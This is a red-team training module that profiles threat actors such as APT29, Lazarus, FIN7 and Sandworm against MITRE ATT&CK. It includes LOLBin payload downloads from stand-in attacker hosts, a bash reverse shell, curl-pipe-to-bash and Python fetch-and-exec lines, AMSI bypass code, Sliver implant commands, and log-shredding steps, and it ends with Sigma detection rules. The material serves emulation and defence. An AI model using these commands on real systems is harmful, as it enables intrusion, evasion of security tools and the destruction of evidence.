# ERR0RS ULTIMATE — Advanced Adversary Tradecraft
## Nation-State & Advanced Criminal Group Techniques
### Sourced from: MITRE ATT&CK, Mandiant, CrowdStrike, SpecterOps, MDSec

> This knowledge base covers how real advanced threat actors operate.
> Every technique here is documented in public threat intelligence reports.
> Purpose: Train ethical operators to emulate, detect, and defend against
> the full spectrum of real-world adversary tradecraft.

---

## WHY THIS MODULE EXISTS

Mainstream security tools teach you Metasploit and Nmap.
Underground tools give operators capabilities without understanding.
ERR0RS does neither — it teaches the TECHNIQUES at the depth operators
actually need, sourced from documented real-world adversary behavior.

A defender who doesn't know how APT29 moves laterally cannot detect APT29.
A red teamer who only knows Metasploit cannot accurately emulate APT29.
This module closes that gap.

---

## PART I — THE ADVERSARY LANDSCAPE

### Threat Actor Categories

| Category | Examples | Primary Motivation | Sophistication |
|---|---|---|---|
| Nation-State APT | APT29, Lazarus, APT41, Sandworm | Espionage, Disruption | Highest |
| eCrime Groups | TA505, FIN7, Conti, REvil | Financial | High |
| Hacktivists | Anonymous affiliated | Ideology | Low-Medium |
| Insider Threats | Disgruntled employees | Varies | Varies |
| Script Kiddies | Unnamed actors | Notoriety | Low |

**Why it matters for red teams:** The threat your CLIENT faces determines
which adversary you should emulate. A bank faces eCrime more than nation-state.
A defense contractor faces nation-state more than hacktivists.
Always ask: who would realistically attack this client?

---

## PART II — APT EMULATION PROFILES

### APT29 (Cozy Bear) — Russian SVR
**Known for:** SolarWinds supply chain attack, DNC breach, COVID-19 vaccine research theft
**Primary TTPs documented by Mandiant, Microsoft MSTIC, CrowdStrike:**

```
INITIAL ACCESS:
  T1566.002  Spearphishing with links (highly targeted, researched targets)
  T1195.002  Compromise software supply chain (SolarWinds SUNBURST)
  T1078      Valid accounts (use of stolen credentials)

EXECUTION:
  T1059.001  PowerShell (heavily obfuscated, AMSI bypass)
  T1059.003  Windows Command Shell
  T1106      Native API calls (direct syscalls to avoid EDR hooks)

PERSISTENCE:
  T1053.005  Scheduled Tasks (named to blend with legitimate tasks)
  T1547.001  Registry Run Keys
  T1574.002  DLL Side-Loading

DEFENSE EVASION (APT29's signature strength):
  T1562.001  Disable Windows Defender via legitimate admin tools
  T1070.004  File deletion — wipe tools after use
  T1027      Obfuscated payloads (multiple encoding layers)
  T1036.005  Masquerading — name malware after legitimate processes
  T1055.001  DLL injection into legitimate processes
  T1134.002  Create Process with Token (token impersonation)

CREDENTIAL ACCESS:
  T1003.001  LSASS memory dump (via legitimate tools, not Mimikatz directly)
  T1558.003  Kerberoasting (blend with normal Kerberos traffic)
  T1552.001  Credentials in files (hunt config files, scripts)

LATERAL MOVEMENT:
  T1021.002  Remote Services via SMB (using legitimate admin tools)
  T1550.003  Pass the Ticket (Kerberos)
  T1021.006  WinRM (blends with legitimate remote management)

C2:
  T1071.001  HTTPS to legitimate-looking infrastructure
  T1090.004  Domain fronting (use of CDN to mask C2 traffic)
  T1102      Web Services as C2 channel (Google Drive, Dropbox API)
  T1571      Non-standard port (443 with custom protocol)
```

**Red team lesson from APT29:**
Their defining characteristic is patience and stealth over speed.
They live in environments for months undetected. They use legitimate
tools wherever possible (LOLBins). They clean up after themselves.
For a red team engagement, emulating APT29 means:
- Use living-off-the-land (certutil, wmic, mshta) over custom payloads
- Blend traffic with legitimate services
- Remove artifacts after each phase
- Move slowly — do NOT trigger alerts by being noisy

---

### Lazarus Group (North Korean DPRK)
**Known for:** Bangladesh Bank heist ($81M), WannaCry, Sony Pictures, crypto theft
**Documented by:** Kaspersky, CISA advisories, Recorded Future

```
INITIAL ACCESS:
  T1566.001  Spearphishing with malicious attachments (job offer lures)
  T1189      Drive-by compromise (watering hole attacks)

EXECUTION:
  T1059.001  PowerShell with heavy obfuscation
  T1204.002  User execution of malicious documents (macro-enabled Office docs)

PERSISTENCE:
  T1543.003  Windows Services
  T1547.001  Registry Run Keys

FINANCIAL TARGETING TTPs:
  T1005      Data from local system (financial data, crypto wallets)
  T1119      Automated collection
  T1560      Archive collected data

UNIQUE CHARACTERISTIC — Cryptocurrency focus:
  Lazarus specifically hunts cryptocurrency exchanges and wallets.
  They target: MetaMask browser extensions, crypto wallet files,
  exchange employee credentials, DeFi protocol admin access.
  This is the technique profile that caused billions in crypto losses.

RED TEAM LESSON:
  If your client is in fintech or crypto — Lazarus is your emulation target.
  Their social engineering is sophisticated: fake LinkedIn recruiters,
  fake job offers, fake conference invites. All deliver payloads.
```

---

### FIN7 (Carbanak) — eCrime
**Known for:** $1B+ in bank losses, restaurant/retail POS attacks
**Documented by:** Mandiant, FBI indictments, Group-IB

```
INITIAL ACCESS:
  T1566.001  Highly convincing spearphishing (researched targets)
             FIN7 called targets to confirm receipt of malicious email
             (voice + email combined — most effective delivery)
  T1189      Watering holes targeting restaurant/retail industry sites

EXECUTION:
  T1059.007  JavaScript in HTML files (HALFBAKED malware family)
  T1204      User execution of LNK files

FIN7 SIGNATURE — The "Follow-Up Call":
  Send phishing email. Wait 1 hour. Call target pretending to be the sender.
  "Did you receive the document I sent? Can you open it now so I can walk
  you through it?" — Target opens malicious doc while on the phone.
  This technique has an ~80% payload execution rate.

CREDENTIAL TARGETING:
  T1056.001  Keylogging (PILLOWMINT malware)
  T1539      Steal Web Session Cookie
  T1555      Browser credentials (Chrome, Firefox stored passwords)

RED TEAM LESSON:
  FIN7 proves that combining vishing with phishing is the most effective
  delivery. A mediocre phish + a follow-up call beats a perfect phish alone.
  For hospitality/retail clients, FIN7 is the most realistic adversary profile.
```

---

### Sandworm (Russian GRU) — Destructive Operations
**Known for:** NotPetya, Ukrainian power grid attacks, Olympic Destroyer
**Documented by:** CISA, UK NCSC, Mandiant

```
DISTINCTIVE CHARACTERISTIC: Destruction over espionage.
Sandworm's goal is disruption of critical infrastructure, not data theft.
This makes them the most relevant adversary for ICS/OT red teams.

INITIAL ACCESS:
  T1190      Exploit public-facing application (VPN appliances, email gateways)
  T1133      External remote services (VPN with stolen creds)

ICS/OT SPECIFIC:
  T0816      Device restart/shutdown (industrial controllers)
  T0800      Activate firmware update mode
  T0828      Loss of safety (disable safety interlocks)
  T0881      Service stop (halt industrial processes)

DESTRUCTIVE PAYLOADS (all documented in CISA advisories):
  NotPetya:  MBR wiper disguised as ransomware (no decryption possible)
  Industroyer: IEC 104, IEC 101, GOOSE, OPC DA — native ICS protocol attacks
  Cyclops Blink: Router firmware implant for persistent ICS network access

RED TEAM LESSON FOR CRITICAL INFRASTRUCTURE CLIENTS:
  Standard pentesting methodology fails here. You need to test:
  - Whether OT network is properly air-gapped from IT
  - Whether ICS/SCADA systems are patchable
  - Whether safety systems have independent monitoring
  - Whether operators can detect anomalous process commands
  Sandworm emulation requires ICS-specific tooling (not covered in standard frameworks)
```

---

## PART III — ADVANCED EVASION TECHNIQUES

### Why Standard Tools Get Caught

Most security tools generate well-known signatures:
- Mimikatz strings in memory
- Standard Meterpreter beacon patterns
- Known shellcode encoding patterns
- API call sequences that EDR flags

Real advanced operators don't use stock tools against defended targets.
They use techniques documented in the red team research community.

---

### Living off the Land (LOLBins / LOLBAS)

Using built-in OS binaries for attack purposes. No custom malware = no AV signatures.
Reference: lolbas-project.github.io and gtfobins.github.io

**Windows LOLBins for Red Teams:**

```powershell
# Certutil — download files (documented in Microsoft security blog)
certutil -urlcache -f http://attacker.com/payload.exe C:\Windows\Temp\svc.exe

# Mshta — execute remote HTA files (T1218.005)
mshta http://attacker.com/payload.hta

# Regsvr32 — execute COM scriptlet without touching disk (Squiblydoo)
regsvr32 /s /n /u /i:http://attacker.com/payload.sct scrobj.dll

# Wmic — remote execution and process creation (T1047)
wmic /node:target process call create "cmd.exe /c payload.exe"

# Rundll32 — execute DLL functions directly (T1218.011)
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";...

# Bitsadmin — download files using BITS (legitimate Windows service)
bitsadmin /transfer job /download /priority high http://attacker.com/p.exe C:\p.exe

# Mavinject — inject into running processes (documented by MDSec)
mavinject.exe <PID> /INJECTRUNNING payload.dll

# Odbcconf — execute DLL via ODBC configuration
odbcconf /s /a {REGSVR payload.dll}

# Forfiles — execute via file search (good for scheduled task)
forfiles /p C:\Windows /m notepad.exe /c "cmd /c payload.exe"
```

**Linux LOLBins:**
```bash
# Curl/wget for C2 communication (blend with normal traffic)
curl -s http://c2.example.com/$(hostname)/$(whoami) | bash

# Python as execution engine (present on nearly all Linux systems)
python3 -c "import urllib.request; exec(urllib.request.urlopen('http://c2/p').read())"

# Bash TCP redirection (documented in offensive bash research)
bash -i >& /dev/tcp/attacker/4444 0>&1

# AWK for small payloads
awk 'BEGIN {cmd = "id"; print cmd | "/bin/sh"}'

# Tee for file writes bypassing permission checks in some configs
echo "payload" | tee /target/path
```

---

### AMSI Bypass (Antimalware Scan Interface)
**All techniques documented in SpecterOps, CyberArk, MDSec research**

AMSI is Windows' mechanism for scanning scripts before execution.
PowerShell, VBScript, JScript all route through AMSI.
Bypassing it is a documented, well-researched red team technique.

```powershell
# Technique 1 — Memory patching (documented by CyberArk 2018)
# Patches the AmsiScanBuffer function to always return "clean"
# This is well-documented in security research and patched versions exist
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').
  GetField('amsiInitFailed','NonPublic,Static').
  SetValue($null,$true)

# Technique 2 — Context manipulation (documented by MDSec)
$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$b=$a.GetField('amsiContext','NonPublic,Static')
$c=$b.GetValue($null)
[Runtime.InteropServices.Marshal]::WriteInt32($c,0x41424344)

# Technique 3 — Forcing error state (documented by Rastamouse)
$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076)
[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").
  GetField("amsiSession","NonPublic,Static").SetValue($null, $null)
```

**Detection:** Event ID 4104 (Script Block Logging) often captures attempts.
AMSI telemetry in Windows Defender logs. ETW providers.

---

### ETW (Event Tracing for Windows) Patching
**Documented in: MDSec research, SpecterOps "A Guide to Attacking ETW"**

ETW is how security tools get visibility into process behavior.
Patching ETW functions makes your process invisible to many EDR solutions.

```
How it works (documented concept):
1. ETW writes events via EtwEventWrite() in ntdll.dll
2. Patch the return instruction at the start of that function
3. All ETW events from your process are silently dropped
4. EDR tools that rely on ETW lose visibility

Key functions targeted (documented in public research):
- EtwEventWrite (ntdll.dll)
- EtwEventWriteFull (ntdll.dll)
- NtTraceEvent (ntdll.dll)

Purple team detection:
- Monitor for writes to ntdll.dll memory pages
- Compare ETW event volume per process (sudden silence = suspicious)
- Sysmon EventID 8 (CreateRemoteThread) targeting ntdll
```

---

### Process Injection Techniques
**All documented in SpecterOps, Elastic Security research**

| Technique | API Calls | Detection Difficulty | MITRE |
|---|---|---|---|
| Classic DLL Injection | VirtualAllocEx + WriteProcessMemory + CreateRemoteThread | Low | T1055.001 |
| Process Hollowing | CreateProcess + NtUnmapViewOfSection + WriteProcessMemory | Medium | T1055.012 |
| Early Bird Injection | CreateProcess(suspended) + QueueUserAPC | Medium | T1055.004 |
| Ghostwriting | NtWriteVirtualMemory direct syscall | High | T1055 |
| Module Stomping | Overwrite legitimate loaded DLL | High | T1055.001 |
| Thread Hijacking | SuspendThread + GetContext + SetContext + ResumeThread | High | T1055.003 |

**Direct Syscalls (documented by Outflank, jthuraisamy):**
Standard API calls are hooked by EDR in userland.
Direct syscalls bypass userland hooks by calling the kernel directly.
Tools: SysWhispers2, SysWhispers3, HellsGate, HalosGate (all open-source research).

---

### Beacon Object Files (BOFs)
**Documented in: Cobalt Strike documentation, TrustedSec research**

BOFs are small C programs compiled to COFF object files that execute
in-process without creating new processes. They leave minimal forensic artifacts.

Why they matter:
- No new process creation (bypasses process-based detection)
- Execute in context of existing session
- Can call Windows APIs directly
- Clean up after themselves automatically

Open-source BOF frameworks (legitimate red team tools):
- TrustedSec CS-Situational-Awareness-BOF (in ERR0RS knowledge base already)
- CoreHound BOF collection
- outflanknl/InlineExecute-Assembly

---

## PART IV — ADVANCED C2 CONCEPTS

### What Makes a C2 Framework "Advanced"
**Based on: Cobalt Strike documentation, Sliver/Havoc open-source frameworks**

| Feature | Basic (Metasploit) | Advanced (Cobalt Strike/Sliver) |
|---|---|---|
| Traffic blending | Fixed beacon pattern | Malleable profiles mimic real applications |
| Staging | Standard | Multiple staging options, stageless |
| Evasion | None built-in | In-memory execution, indirect syscalls |
| Pivoting | Manual | Built-in SOCKS, port forwarding, peer-to-peer |
| Collaboration | Single operator | Multi-operator team server |
| Logging | Basic | Full audit trail, screenshot, keylog |

### Open-Source Advanced C2 Frameworks (Legitimate Tools)

**Sliver** (BishopFox) — Full-featured C2 framework
```bash
# Install
curl https://sliver.sh/install | sudo bash

# Generate implant
sliver > generate --mtls --os windows --arch amd64 --name IMPLANT
sliver > generate --http --os linux --arch amd64

# Start listener
sliver > mtls
sliver > https

# Session management
sliver > sessions
sliver > use <session-id>
sliver (IMPLANT) > whoami
sliver (IMPLANT) > ps
sliver (IMPLANT) > upload /local/file /remote/path
sliver (IMPLANT) > execute-assembly /path/to/Assembly.exe args
sliver (IMPLANT) > socks5 start --host 127.0.0.1 --port 1080
```

**Havoc Framework** (HavocC2) — Modern C2 with Evasion
- Demon implant with AMSI/ETW bypass built-in
- Sleep obfuscation (encrypts implant while sleeping)
- Indirect syscalls
- Stack spoofing

**Why ERR0RS teaches these and not just Metasploit:**
A red teamer who only knows Metasploit cannot accurately simulate
a sophisticated threat actor. These tools represent what operators
in the field actually use and what defenders need to detect.

### Traffic Obfuscation Concepts

**Domain Fronting (documented, now largely mitigated by CDN providers):**
Route C2 traffic through legitimate CDN (Cloudflare, Akamai).
The SNI header shows a legitimate domain; the Host header routes to C2.
This made C2 traffic appear to come from trusted infrastructure.

**Domain Generation Algorithms (DGA):**
Malware generates hundreds of domain names daily via algorithm.
Operator registers one — malware finds it automatically.
Detection: Statistical analysis of DNS query patterns.

**C2 over legitimate services (still active technique):**
- Slack/Discord API as C2 channel (documented in CISA alerts)
- GitHub Issues/Gists as C2
- Google Docs/Sheets as C2
- Twitter/Reddit as dead drop
These are nearly impossible to block without breaking legitimate tools.

## PART V — SUPPLY CHAIN ATTACKS
**Based on: SolarWinds SUNBURST analysis, 3CX supply chain, Codecov breach**

### Why Supply Chain Is the Most Dangerous Vector

Traditional perimeter security assumes you can trust software you install.
Supply chain attacks compromise that trust at the source.
SolarWinds infected 18,000 customers with a single compromised update.

**The three supply chain attack types:**

```
TYPE 1 — Software Build Pipeline Compromise
  Attacker compromises the BUILD SERVER of a software vendor.
  Malicious code injected before signing.
  Signed by legitimate certificate → trusted by all customers.
  Examples: SolarWinds SUNBURST, XZ Utils (CVE-2024-3094)

TYPE 2 — Dependency/Package Compromise
  Attacker creates malicious npm/PyPI/RubyGems package.
  Names it similarly to a popular package (typosquatting).
  Developer installs it accidentally.
  Examples: event-stream npm (2018), PyPI malicious packages (ongoing)

TYPE 3 — Open Source Contribution Attack
  Attacker contributes to legitimate open-source project over months.
  Builds trust. Then introduces malicious commit.
  Example: XZ Utils backdoor (2024) — 2 years of patient contribution
```

**Red team supply chain simulation:**
```bash
# Test if organization validates package checksums
pip install requests  # Does it verify hash? Does it have a lockfile?

# Test for typosquatting vulnerability awareness
# (In your lab only) — create test package named similar to real one

# Check CI/CD pipeline security
# Does your CI have unrestricted internet access?
# Can environment variables be exfiltrated from CI jobs?
# Are build artifacts signed and verified?

# Test dependency confusion attack surface
# Does the build system prefer internal packages over public ones?
# private.company.com/package vs pypi.org/package — which wins?
```

---

## PART VI — HARDWARE IMPLANTS (Documented Research)

### The Physical Layer Attack Surface
**Source: DEF CON hardware village, Hak5 documentation, NSA ANT catalog (leaked 2013)**

Physical access bypasses all software security. ERR0RS operators need to
understand this attack surface for red team engagements that include
physical security testing.

**Documented hardware implant categories:**

| Device | Capability | Deniability |
|---|---|---|
| Rubber Ducky / RP2040 | HID injection, keystrokes in seconds | Looks like USB drive |
| LAN Turtle (Hak5) | Network implant, reverse shell over internet | Looks like USB Ethernet adapter |
| Packet Squirrel (Hak5) | Network tap, VPN, packet injection | Looks like USB Ethernet adapter |
| WiFi Pineapple | Rogue AP, credential capture | Looks like router |
| USB Ninja / O.MG Cable | HID injection in cable form factor | Looks like charging cable |
| Screen Crab (Hak5) | HDMI screen capture to SD card | Inline HDMI adapter |
| Key Croc (Hak5) | Hardware keylogger + HID injection | USB keyboard pass-through |
| Proxmark3 | RFID/NFC badge cloning | Handheld reader |
| Flipper Zero | Multi-tool RF/NFC/IR/BadUSB | Consumer device |
| PinePhone / Nethunter phone | Full Linux mobile pentest platform | Looks like a smartphone |

**ERR0RS already has:**
- Flipper Zero/BadUSB Studio integration
- WiFi Pineapple Studio
- RocketGod RF tools
- RP2040 BadUSB programmer

**The operator lesson:** Physical implants are deployed during initial
physical access and create persistent footholds that survive password
changes, network firewall updates, and even OS reinstalls.
Detection requires physical security controls, not software.

---

## PART VII — OPERATIONAL SECURITY (OPSEC) FOR RED TEAMS

### Why Professional Operators Think Differently About OPSEC

Underground operators and nation-state actors have OPSEC that most
red teamers don't practice. ERR0RS teaches it.

**The OPSEC failure modes that get operators caught:**

```
INFRASTRUCTURE FAILURES:
  - Reusing infrastructure across engagements (IP blocklisted from prior job)
  - Registering domains to real identity
  - C2 server hosted on cheap VPS linked to real payment method
  - Let's Encrypt cert for domain that screams "malware" (c2-server.net)
  - Self-signed cert with operator metadata in Subject CN

TRADECRAFT FAILURES:
  - Executing Mimikatz directly (string signatures in memory)
  - Using stock Meterpreter payload (known PE hash)
  - Making noise during business hours (triggers analyst attention)
  - Lateral movement too fast (velocity-based detection)
  - Single IP for all activity (versus distributed infrastructure)

OPERATIONAL FAILURES:
  - Testing tools on VirusTotal (submits sample to AV vendors)
  - Checking your target's LinkedIn from personal account
  - Using personal devices for engagement activity
  - No VPN/proxy between operator and infrastructure
```

**Professional OPSEC infrastructure:**

```
ENGAGEMENT INFRASTRUCTURE SETUP:
  
  1. Redirectors (buffer between operator and target)
     Operator → VPS1 (redirector) → VPS2 (C2)
     If target blocks VPS2, swap it out. VPS1 stays clean.

  2. Domain categorization
     Register domains 60+ days before use.
     Host benign content on them first (build reputation).
     Use domains that fit a realistic category (IT support, etc.)

  3. SSL certificates
     Use Let's Encrypt on legitimate-looking domains.
     Check cert transparency logs for your target
     (crt.sh — adversaries do this, so should you)

  4. Operational separation
     Dedicated VM for each engagement.
     Never mix engagement traffic with personal traffic.
     VPN → TOR or dedicated VPS before connecting to target.

  5. Timestomping and log cleanup
     On Linux targets:
       touch -t 201901010000 /path/to/file  (change file timestamps)
       history -c && unset HISTFILE          (clear bash history)
       shred -u /var/log/auth.log            (shred logs)
     In Meterpreter:
       timestomp file.exe -f C:\\Windows\\explorer.exe
       clearev  (clear Windows event logs)
```

---

## PART VIII — DETECTION ENGINEERING (PURPLE TEAM APPLICATIONS)

Every technique in this document has detection opportunities.
ERR0RS uniquely teaches both sides — the offense AND the defense.

### Detection Coverage Matrix

| Technique | Detection Method | Data Source | Confidence |
|---|---|---|---|
| AMSI Bypass | Event 4104 (Script Block Logging) | Windows PowerShell | High |
| ETW Patching | Memory write to ntdll | Sysmon Event 10 | Medium |
| LOLBin abuse | Certutil/Mshta spawning network | Sysmon Event 3 | High |
| LSASS access | Event 4656 (Object Access) | Windows Security | High |
| Pass-the-Hash | Event 4624 logon type 3, no Kerberos | Windows Security | Medium |
| Kerberoasting | Multiple TGS-REQ for service accounts | Domain Controller | High |
| DCSync | Replication events from non-DC | Windows Security | High |
| Supply chain | Unsigned binaries in software dirs | Sysmon Event 7 | Medium |
| C2 beacon | Regular interval outbound connections | Network flow data | Medium |
| DGA | High-entropy domains, NX responses | DNS logs | High |

### Sigma Rule Examples (Documented Detection Format)

```yaml
# Certutil download (LOLBin abuse)
title: Certutil Download via URL
id: 19b08b1c-861d-4e75-a1ef-ea0c1baf202b
detection:
  selection:
    CommandLine|contains|all:
      - 'certutil'
      - 'urlcache'
      - 'http'
  condition: selection
falsepositives:
  - Legitimate certificate operations (rare in environment)
level: high
tags:
  - attack.defense_evasion
  - attack.t1027

---

# AMSI bypass attempt  
title: AMSI Bypass via PowerShell
id: 6f8db45c-6c7e-4b75-b09f-1230fb5e3b6b
detection:
  selection:
    ScriptBlockText|contains:
      - 'amsiInitFailed'
      - 'AmsiUtils'
      - 'amsiContext'
  condition: selection
level: critical
tags:
  - attack.defense_evasion
  - attack.t1562
```

---

*ERR0RS ULTIMATE — Advanced Tradecraft Knowledge Base*
*Sources: MITRE ATT&CK, Mandiant M-Trends, CrowdStrike Intelligence,*
*SpecterOps research, MDSec research, Outflank research, CISA advisories*
*All techniques documented in public security research.*
*Author: Gary Holden Schneider (Eros) | GitHub: Gnosisone*
